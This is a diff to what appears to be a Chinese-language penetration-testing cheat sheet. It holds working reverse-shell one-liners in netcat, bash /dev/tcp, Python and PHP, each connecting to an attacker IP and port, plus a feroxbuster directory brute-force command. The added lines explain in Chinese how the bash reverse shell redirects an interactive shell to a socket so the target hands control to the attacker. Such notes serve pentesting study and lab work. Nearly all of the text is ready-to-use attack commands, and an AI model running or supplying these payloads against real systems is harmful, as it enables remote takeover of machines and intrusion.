@@ -43,7 +43,14 @@ feroxbuster -t 10 -u https://www.example.com -k -w /usr/share/seclists/Discovery
 
 nc -lvp (192.168.0.1) 4444
 nc 192.168.0.1 4444 -e /bin/bash  连接到192.168.0.1 4444 并弹一个shell给192.168.0.1
-/bin/bash -i >& /dev/tcp/10.0.0.123/1111 0>&1
+/bin/bash -i &> /dev/tcp/10.0.0.123/1111 0>&1
+1、bash -i 创建一个交互式shell, & 表示在后台执行
+2、/dev/tcp/ip/host 表示创建一个 ip:host socket 连接。
+3 bash -i &> /dev/tcp/ip/host 表示将 bash -i & 在后台执行，且将交互式shell的输出重定向到 /dev/tcp/ip/host 的socket 
+也就是bash -i 执行的命令结果发送给 ip:host主机并显示，但是 输入仍然在本机显示
+4、0>&1 表示将 标准输入重定向到标准输出.也就是在靶机上输入任何命令不回显，因为输入和结果已经发送到了攻击机上了
+这个命令的整个意思是  在后台创建一个交互式的shell, 将标准输入重定向到标准输出，再将标准输出重定向到 /dev/tcp/ip/host 的socket上 。 也就是靶机反弹一个shell给攻击机.
+
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.123",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 php -r '$sock=fsockopen("10.0.0.123",1111);exec("/bin/sh -i <&3 >&3 2>&3");'
 
